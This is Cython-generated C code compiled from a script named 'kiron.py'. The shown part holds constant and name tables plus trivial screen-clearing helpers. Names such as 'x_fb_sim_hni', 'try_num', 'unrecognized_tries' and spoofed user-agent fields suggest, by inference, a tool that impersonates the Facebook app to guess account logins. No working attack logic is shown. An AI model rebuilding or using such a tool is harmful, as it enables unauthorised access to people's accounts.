#define __pyx_n_s_total_ids __pyx_mstate_global->__pyx_n_s_total_ids
#define __pyx_n_s_tred __pyx_mstate_global->__pyx_n_s_tred
#define __pyx_n_s_true __pyx_mstate_global->__pyx_n_s_true
#define __pyx_n_s_try_num __pyx_mstate_global->__pyx_n_s_try_num
#define __pyx_n_s_try_number __pyx_mstate_global->__pyx_n_s_try_number
#define __pyx_n_s_twf __pyx_mstate_global->__pyx_n_s_twf
#define __pyx_n_s_ua __pyx_mstate_global->__pyx_n_s_ua
#define __pyx_n_s_uid __pyx_mstate_global->__pyx_n_s_uid
#define __pyx_n_s_uidx __pyx_mstate_global->__pyx_n_s_uidx
#define __pyx_n_s_unknown __pyx_mstate_global->__pyx_n_s_unknown
#define __pyx_n_s_uno __pyx_mstate_global->__pyx_n_s_uno
#define __pyx_n_s_unrecognized_tries __pyx_mstate_global->__pyx_n_s_unrecognized_tries
#define __pyx_kp_s_upgrade_insecure_requests __pyx_mstate_global->__pyx_kp_s_upgrade_insecure_requests
#define __pyx_n_s_urandom __pyx_mstate_global->__pyx_n_s_urandom
#define __pyx_n_s_url __pyx_mstate_global->__pyx_n_s_url
#define __pyx_n_s_urllib __pyx_mstate_global->__pyx_n_s_urllib
#define __pyx_n_s_urllib3 __pyx_mstate_global->__pyx_n_s_urllib3
#define __pyx_n_s_urllib_request __pyx_mstate_global->__pyx_n_s_urllib_request
#define __pyx_n_s_urlopen __pyx_mstate_global->__pyx_n_s_urlopen
#define __pyx_n_s_us __pyx_mstate_global->__pyx_n_s_us
#define __pyx_n_s_user __pyx_mstate_global->__pyx_n_s_user
#define __pyx_kp_s_user_agent __pyx_mstate_global->__pyx_kp_s_user_agent
#define __pyx_n_s_usergent __pyx_mstate_global->__pyx_n_s_usergent
#define __pyx_kp_s_utf_8 __pyx_mstate_global->__pyx_kp_s_utf_8
#define __pyx_n_s_uuid __pyx_mstate_global->__pyx_n_s_uuid
#define __pyx_n_s_uuid4 __pyx_mstate_global->__pyx_n_s_uuid4
#define __pyx_n_s_value __pyx_mstate_global->__pyx_n_s_value
#define __pyx_n_s_verify __pyx_mstate_global->__pyx_n_s_verify
#define __pyx_kp_s_viewport_width __pyx_mstate_global->__pyx_kp_s_viewport_width
#define __pyx_n_s_w __pyx_mstate_global->__pyx_n_s_w
#define __pyx_kp_s_width __pyx_mstate_global->__pyx_kp_s_width
#define __pyx_n_s_windows __pyx_mstate_global->__pyx_n_s_windows
#define __pyx_n_s_write __pyx_mstate_global->__pyx_n_s_write
#define __pyx_kp_s_www_facebook_com __pyx_mstate_global->__pyx_kp_s_www_facebook_com
#define __pyx_n_s_x __pyx_mstate_global->__pyx_n_s_x
#define __pyx_kp_s_x_fb_connection_bandwidth __pyx_mstate_global->__pyx_kp_s_x_fb_connection_bandwidth
#define __pyx_kp_s_x_fb_connection_quality __pyx_mstate_global->__pyx_kp_s_x_fb_connection_quality
#define __pyx_kp_s_x_fb_connection_type __pyx_mstate_global->__pyx_kp_s_x_fb_connection_type
#define __pyx_kp_s_x_fb_http_engine __pyx_mstate_global->__pyx_kp_s_x_fb_http_engine
#define __pyx_kp_s_x_fb_net_hni __pyx_mstate_global->__pyx_kp_s_x_fb_net_hni
#define __pyx_kp_s_x_fb_sim_hni __pyx_mstate_global->__pyx_kp_s_x_fb_sim_hni
#define __pyx_n_s_xd __pyx_mstate_global->__pyx_n_s_xd
#define __pyx_kp_s_xdg_open_https_wa_me_88019097655 __pyx_mstate_global->__pyx_kp_s_xdg_open_https_wa_me_88019097655
#define __pyx_kp_s_xdg_open_https_www_facebook_com __pyx_mstate_global->__pyx_kp_s_xdg_open_https_www_facebook_com
#define __pyx_n_s_y __pyx_mstate_global->__pyx_n_s_y
#define __pyx_n_s_year __pyx_mstate_global->__pyx_n_s_year
#define __pyx_n_s_yes __pyx_mstate_global->__pyx_n_s_yes
#define __pyx_n_s_zlib __pyx_mstate_global->__pyx_n_s_zlib
#define __pyx_float_2e7 __pyx_mstate_global->__pyx_float_2e7
#define __pyx_float_3e7 __pyx_mstate_global->__pyx_float_3e7
#define __pyx_float_20000000_0 __pyx_mstate_global->__pyx_float_20000000_0
#define __pyx_float_30000000_0 __pyx_mstate_global->__pyx_float_30000000_0
#define __pyx_int_0 __pyx_mstate_global->__pyx_int_0
#define __pyx_int_1 __pyx_mstate_global->__pyx_int_1
#define __pyx_int_2 __pyx_mstate_global->__pyx_int_2
#define __pyx_int_3 __pyx_mstate_global->__pyx_int_3
#define __pyx_int_4 __pyx_mstate_global->__pyx_int_4
#define __pyx_int_5 __pyx_mstate_global->__pyx_int_5
#define __pyx_int_6 __pyx_mstate_global->__pyx_int_6
#define __pyx_int_7 __pyx_mstate_global->__pyx_int_7
#define __pyx_int_8 __pyx_mstate_global->__pyx_int_8
#define __pyx_int_9 __pyx_mstate_global->__pyx_int_9
#define __pyx_int_10 __pyx_mstate_global->__pyx_int_10
#define __pyx_int_11 __pyx_mstate_global->__pyx_int_11
#define __pyx_int_12 __pyx_mstate_global->__pyx_int_12
#define __pyx_int_13 __pyx_mstate_global->__pyx_int_13
#define __pyx_int_16 __pyx_mstate_global->__pyx_int_16
#define __pyx_int_17 __pyx_mstate_global->__pyx_int_17
#define __pyx_int_18 __pyx_mstate_global->__pyx_int_18
#define __pyx_int_19 __pyx_mstate_global->__pyx_int_19
#define __pyx_int_20 __pyx_mstate_global->__pyx_int_20
#define __pyx_int_30 __pyx_mstate_global->__pyx_int_30
#define __pyx_int_34 __pyx_mstate_global->__pyx_int_34
#define __pyx_int_36 __pyx_mstate_global->__pyx_int_36
#define __pyx_int_38 __pyx_mstate_global->__pyx_int_38
#define __pyx_int_39 __pyx_mstate_global->__pyx_int_39
#define __pyx_int_40 __pyx_mstate_global->__pyx_int_40
#define __pyx_int_42 __pyx_mstate_global->__pyx_int_42
#define __pyx_int_44 __pyx_mstate_global->__pyx_int_44
#define __pyx_int_49 __pyx_mstate_global->__pyx_int_49
#define __pyx_int_59 __pyx_mstate_global->__pyx_int_59
#define __pyx_int_77 __pyx_mstate_global->__pyx_int_77
#define __pyx_int_89 __pyx_mstate_global->__pyx_int_89
#define __pyx_int_99 __pyx_mstate_global->__pyx_int_99
#define __pyx_int_110 __pyx_mstate_global->__pyx_int_110
#define __pyx_int_111 __pyx_mstate_global->__pyx_int_111
#define __pyx_int_120 __pyx_mstate_global->__pyx_int_120
#define __pyx_int_311 __pyx_mstate_global->__pyx_int_311
#define __pyx_int_499 __pyx_mstate_global->__pyx_int_499
#define __pyx_int_511 __pyx_mstate_global->__pyx_int_511
#define __pyx_int_552 __pyx_mstate_global->__pyx_int_552
#define __pyx_int_599 __pyx_mstate_global->__pyx_int_599
#define __pyx_int_661 __pyx_mstate_global->__pyx_int_661
#define __pyx_int_742 __pyx_mstate_global->__pyx_int_742
#define __pyx_int_999 __pyx_mstate_global->__pyx_int_999
#define __pyx_int_1111 __pyx_mstate_global->__pyx_int_1111
#define __pyx_int_2200 __pyx_mstate_global->__pyx_int_2200
#define __pyx_int_7120 __pyx_mstate_global->__pyx_int_7120
#define __pyx_int_7999 __pyx_mstate_global->__pyx_int_7999
#define __pyx_int_9999 __pyx_mstate_global->__pyx_int_9999
#define __pyx_int_11111 __pyx_mstate_global->__pyx_int_11111
#define __pyx_int_20000 __pyx_mstate_global->__pyx_int_20000
#define __pyx_int_40000 __pyx_mstate_global->__pyx_int_40000
#define __pyx_int_66666 __pyx_mstate_global->__pyx_int_66666
#define __pyx_int_99999 __pyx_mstate_global->__pyx_int_99999
#define __pyx_int_111111 __pyx_mstate_global->__pyx_int_111111
#define __pyx_int_199999 __pyx_mstate_global->__pyx_int_199999
#define __pyx_int_900000 __pyx_mstate_global->__pyx_int_900000
#define __pyx_int_999999 __pyx_mstate_global->__pyx_int_999999
#define __pyx_int_1111111 __pyx_mstate_global->__pyx_int_1111111
#define __pyx_int_7777777 __pyx_mstate_global->__pyx_int_7777777
#define __pyx_int_20000000 __pyx_mstate_global->__pyx_int_20000000
#define __pyx_int_30000000 __pyx_mstate_global->__pyx_int_30000000
#define __pyx_int_100000000 __pyx_mstate_global->__pyx_int_100000000
#define __pyx_int_111111111 __pyx_mstate_global->__pyx_int_111111111
#define __pyx_int_999999999 __pyx_mstate_global->__pyx_int_999999999
#define __pyx_int_1000000000 __pyx_mstate_global->__pyx_int_1000000000
#define __pyx_int_9999999999 __pyx_mstate_global->__pyx_int_9999999999
#define __pyx_tuple_ __pyx_mstate_global->__pyx_tuple_
#define __pyx_tuple__2 __pyx_mstate_global->__pyx_tuple__2
#define __pyx_tuple__3 __pyx_mstate_global->__pyx_tuple__3
#define __pyx_tuple__4 __pyx_mstate_global->__pyx_tuple__4
#define __pyx_tuple__5 __pyx_mstate_global->__pyx_tuple__5
#define __pyx_tuple__6 __pyx_mstate_global->__pyx_tuple__6
#define __pyx_tuple__7 __pyx_mstate_global->__pyx_tuple__7
#define __pyx_tuple__8 __pyx_mstate_global->__pyx_tuple__8
#define __pyx_tuple__9 __pyx_mstate_global->__pyx_tuple__9
#define __pyx_slice__65 __pyx_mstate_global->__pyx_slice__65
#define __pyx_slice__66 __pyx_mstate_global->__pyx_slice__66
#define __pyx_slice__67 __pyx_mstate_global->__pyx_slice__67
#define __pyx_tuple__10 __pyx_mstate_global->__pyx_tuple__10
#define __pyx_tuple__12 __pyx_mstate_global->__pyx_tuple__12
#define __pyx_tuple__13 __pyx_mstate_global->__pyx_tuple__13
#define __pyx_tuple__14 __pyx_mstate_global->__pyx_tuple__14
#define __pyx_tuple__15 __pyx_mstate_global->__pyx_tuple__15
#define __pyx_tuple__16 __pyx_mstate_global->__pyx_tuple__16
#define __pyx_tuple__17 __pyx_mstate_global->__pyx_tuple__17
#define __pyx_tuple__18 __pyx_mstate_global->__pyx_tuple__18
#define __pyx_tuple__19 __pyx_mstate_global->__pyx_tuple__19
#define __pyx_tuple__20 __pyx_mstate_global->__pyx_tuple__20
#define __pyx_tuple__21 __pyx_mstate_global->__pyx_tuple__21
#define __pyx_tuple__22 __pyx_mstate_global->__pyx_tuple__22
#define __pyx_tuple__23 __pyx_mstate_global->__pyx_tuple__23
#define __pyx_tuple__24 __pyx_mstate_global->__pyx_tuple__24
#define __pyx_tuple__26 __pyx_mstate_global->__pyx_tuple__26
#define __pyx_tuple__27 __pyx_mstate_global->__pyx_tuple__27
#define __pyx_tuple__28 __pyx_mstate_global->__pyx_tuple__28
#define __pyx_tuple__29 __pyx_mstate_global->__pyx_tuple__29
#define __pyx_tuple__30 __pyx_mstate_global->__pyx_tuple__30
#define __pyx_tuple__31 __pyx_mstate_global->__pyx_tuple__31
#define __pyx_tuple__34 __pyx_mstate_global->__pyx_tuple__34
#define __pyx_tuple__35 __pyx_mstate_global->__pyx_tuple__35
#define __pyx_tuple__36 __pyx_mstate_global->__pyx_tuple__36
#define __pyx_tuple__37 __pyx_mstate_global->__pyx_tuple__37
#define __pyx_tuple__39 __pyx_mstate_global->__pyx_tuple__39
#define __pyx_tuple__40 __pyx_mstate_global->__pyx_tuple__40
#define __pyx_tuple__41 __pyx_mstate_global->__pyx_tuple__41
#define __pyx_tuple__42 __pyx_mstate_global->__pyx_tuple__42
#define __pyx_tuple__43 __pyx_mstate_global->__pyx_tuple__43
#define __pyx_tuple__44 __pyx_mstate_global->__pyx_tuple__44
#define __pyx_tuple__45 __pyx_mstate_global->__pyx_tuple__45
#define __pyx_tuple__46 __pyx_mstate_global->__pyx_tuple__46
#define __pyx_tuple__47 __pyx_mstate_global->__pyx_tuple__47
#define __pyx_tuple__49 __pyx_mstate_global->__pyx_tuple__49
#define __pyx_tuple__50 __pyx_mstate_global->__pyx_tuple__50
#define __pyx_tuple__51 __pyx_mstate_global->__pyx_tuple__51
#define __pyx_tuple__52 __pyx_mstate_global->__pyx_tuple__52
#define __pyx_tuple__53 __pyx_mstate_global->__pyx_tuple__53
#define __pyx_tuple__55 __pyx_mstate_global->__pyx_tuple__55
#define __pyx_tuple__56 __pyx_mstate_global->__pyx_tuple__56
#define __pyx_tuple__57 __pyx_mstate_global->__pyx_tuple__57
#define __pyx_tuple__58 __pyx_mstate_global->__pyx_tuple__58
#define __pyx_tuple__59 __pyx_mstate_global->__pyx_tuple__59
#define __pyx_tuple__60 __pyx_mstate_global->__pyx_tuple__60
#define __pyx_tuple__61 __pyx_mstate_global->__pyx_tuple__61
#define __pyx_tuple__62 __pyx_mstate_global->__pyx_tuple__62
#define __pyx_tuple__64 __pyx_mstate_global->__pyx_tuple__64
#define __pyx_tuple__68 __pyx_mstate_global->__pyx_tuple__68
#define __pyx_tuple__69 __pyx_mstate_global->__pyx_tuple__69
#define __pyx_tuple__70 __pyx_mstate_global->__pyx_tuple__70
#define __pyx_tuple__73 __pyx_mstate_global->__pyx_tuple__73
#define __pyx_tuple__76 __pyx_mstate_global->__pyx_tuple__76
#define __pyx_tuple__78 __pyx_mstate_global->__pyx_tuple__78
#define __pyx_tuple__79 __pyx_mstate_global->__pyx_tuple__79
#define __pyx_tuple__80 __pyx_mstate_global->__pyx_tuple__80
#define __pyx_tuple__81 __pyx_mstate_global->__pyx_tuple__81
#define __pyx_tuple__82 __pyx_mstate_global->__pyx_tuple__82
#define __pyx_tuple__86 __pyx_mstate_global->__pyx_tuple__86
#define __pyx_tuple__87 __pyx_mstate_global->__pyx_tuple__87
#define __pyx_tuple__89 __pyx_mstate_global->__pyx_tuple__89
#define __pyx_tuple__90 __pyx_mstate_global->__pyx_tuple__90
#define __pyx_tuple__91 __pyx_mstate_global->__pyx_tuple__91
#define __pyx_tuple__92 __pyx_mstate_global->__pyx_tuple__92
#define __pyx_tuple__94 __pyx_mstate_global->__pyx_tuple__94
#define __pyx_tuple__96 __pyx_mstate_global->__pyx_tuple__96
#define __pyx_tuple__97 __pyx_mstate_global->__pyx_tuple__97
#define __pyx_tuple__98 __pyx_mstate_global->__pyx_tuple__98
#define __pyx_tuple__99 __pyx_mstate_global->__pyx_tuple__99
#define __pyx_tuple__100 __pyx_mstate_global->__pyx_tuple__100
#define __pyx_tuple__101 __pyx_mstate_global->__pyx_tuple__101
#define __pyx_tuple__102 __pyx_mstate_global->__pyx_tuple__102
#define __pyx_tuple__103 __pyx_mstate_global->__pyx_tuple__103
#define __pyx_tuple__104 __pyx_mstate_global->__pyx_tuple__104
#define __pyx_tuple__105 __pyx_mstate_global->__pyx_tuple__105
#define __pyx_tuple__106 __pyx_mstate_global->__pyx_tuple__106
#define __pyx_tuple__107 __pyx_mstate_global->__pyx_tuple__107
#define __pyx_tuple__108 __pyx_mstate_global->__pyx_tuple__108
#define __pyx_tuple__109 __pyx_mstate_global->__pyx_tuple__109
#define __pyx_tuple__110 __pyx_mstate_global->__pyx_tuple__110
#define __pyx_tuple__111 __pyx_mstate_global->__pyx_tuple__111
#define __pyx_tuple__112 __pyx_mstate_global->__pyx_tuple__112
#define __pyx_tuple__113 __pyx_mstate_global->__pyx_tuple__113
#define __pyx_tuple__114 __pyx_mstate_global->__pyx_tuple__114
#define __pyx_tuple__115 __pyx_mstate_global->__pyx_tuple__115
#define __pyx_tuple__116 __pyx_mstate_global->__pyx_tuple__116
#define __pyx_tuple__117 __pyx_mstate_global->__pyx_tuple__117
#define __pyx_tuple__118 __pyx_mstate_global->__pyx_tuple__118
#define __pyx_tuple__120 __pyx_mstate_global->__pyx_tuple__120
#define __pyx_tuple__121 __pyx_mstate_global->__pyx_tuple__121
#define __pyx_tuple__122 __pyx_mstate_global->__pyx_tuple__122
#define __pyx_tuple__123 __pyx_mstate_global->__pyx_tuple__123
#define __pyx_tuple__125 __pyx_mstate_global->__pyx_tuple__125
#define __pyx_tuple__126 __pyx_mstate_global->__pyx_tuple__126
#define __pyx_tuple__127 __pyx_mstate_global->__pyx_tuple__127
#define __pyx_tuple__128 __pyx_mstate_global->__pyx_tuple__128
#define __pyx_tuple__129 __pyx_mstate_global->__pyx_tuple__129
#define __pyx_tuple__130 __pyx_mstate_global->__pyx_tuple__130
#define __pyx_tuple__133 __pyx_mstate_global->__pyx_tuple__133
#define __pyx_tuple__136 __pyx_mstate_global->__pyx_tuple__136
#define __pyx_tuple__138 __pyx_mstate_global->__pyx_tuple__138
#define __pyx_tuple__140 __pyx_mstate_global->__pyx_tuple__140
#define __pyx_tuple__142 __pyx_mstate_global->__pyx_tuple__142
#define __pyx_tuple__144 __pyx_mstate_global->__pyx_tuple__144
#define __pyx_tuple__146 __pyx_mstate_global->__pyx_tuple__146
#define __pyx_tuple__147 __pyx_mstate_global->__pyx_tuple__147
#define __pyx_tuple__148 __pyx_mstate_global->__pyx_tuple__148
#define __pyx_tuple__149 __pyx_mstate_global->__pyx_tuple__149
#define __pyx_tuple__151 __pyx_mstate_global->__pyx_tuple__151
#define __pyx_tuple__153 __pyx_mstate_global->__pyx_tuple__153
#define __pyx_tuple__155 __pyx_mstate_global->__pyx_tuple__155
#define __pyx_tuple__157 __pyx_mstate_global->__pyx_tuple__157
#define __pyx_codeobj__95 __pyx_mstate_global->__pyx_codeobj__95
#define __pyx_codeobj__131 __pyx_mstate_global->__pyx_codeobj__131
#define __pyx_codeobj__132 __pyx_mstate_global->__pyx_codeobj__132
#define __pyx_codeobj__134 __pyx_mstate_global->__pyx_codeobj__134
#define __pyx_codeobj__135 __pyx_mstate_global->__pyx_codeobj__135
#define __pyx_codeobj__137 __pyx_mstate_global->__pyx_codeobj__137
#define __pyx_codeobj__139 __pyx_mstate_global->__pyx_codeobj__139
#define __pyx_codeobj__141 __pyx_mstate_global->__pyx_codeobj__141
#define __pyx_codeobj__143 __pyx_mstate_global->__pyx_codeobj__143
#define __pyx_codeobj__145 __pyx_mstate_global->__pyx_codeobj__145
#define __pyx_codeobj__150 __pyx_mstate_global->__pyx_codeobj__150
#define __pyx_codeobj__152 __pyx_mstate_global->__pyx_codeobj__152
#define __pyx_codeobj__154 __pyx_mstate_global->__pyx_codeobj__154
#define __pyx_codeobj__156 __pyx_mstate_global->__pyx_codeobj__156
#define __pyx_codeobj__158 __pyx_mstate_global->__pyx_codeobj__158
#define __pyx_codeobj__159 __pyx_mstate_global->__pyx_codeobj__159
/* #### Code section: module_code ### */

/* "kiron.py":19
 * else:
 *     exit('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')
 * def clear():             # <<<<<<<<<<<<<<
 *         os.system('clear')
 * os.system('clear')
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_1clear(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_1clear = {"clear", (PyCFunction)__pyx_pw_5kiron_1clear, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_1clear(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("clear (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_clear(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_clear(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("clear", 1);

  /* "kiron.py":20
 *     exit('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')
 * def clear():
 *         os.system('clear')             # <<<<<<<<<<<<<<
 * os.system('clear')
 * print('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m CHECKING UPDATE......')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 20, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_n_s_clear};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":19
 * else:
 *     exit('\x1b[38;5;244m[\x1b[38;5;46m\x1b[38;5;244m]\x1b[38;5;46m DO NOT TRY TO FUCK YOUR MOM...')
 * def clear():             # <<<<<<<<<<<<<<
 *         os.system('clear')
 * os.system('clear')
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("kiron.clear", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":130
 * A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
 * #__________________| LINE |__________________#
 * def clear():os.system('clear');print(logo)             # <<<<<<<<<<<<<<
 * def linex():print(f'\x1b[1;97m\033[1;37m')
 * #__________________[ M1 ]__________________#
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_3clear(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_3clear = {"clear", (PyCFunction)__pyx_pw_5kiron_3clear, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_3clear(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("clear (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_2clear(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_2clear(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("clear", 1);
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_n_s_clear};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 1+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 130, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_logo); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 130, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("kiron.clear", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":131
 * #__________________| LINE |__________________#
 * def clear():os.system('clear');print(logo)
 * def linex():print(f'\x1b[1;97m\033[1;37m')             # <<<<<<<<<<<<<<
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_5linex(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_5linex = {"linex", (PyCFunction)__pyx_pw_5kiron_5linex, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_5linex(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("linex (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_4linex(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_4linex(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("linex", 1);
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 131, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_AddTraceback("kiron.linex", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":133
 * def linex():print(f'\x1b[1;97m\033[1;37m')
 * #__________________[ M1 ]__________________#
 * def AYYUB_M1():             # <<<<<<<<<<<<<<
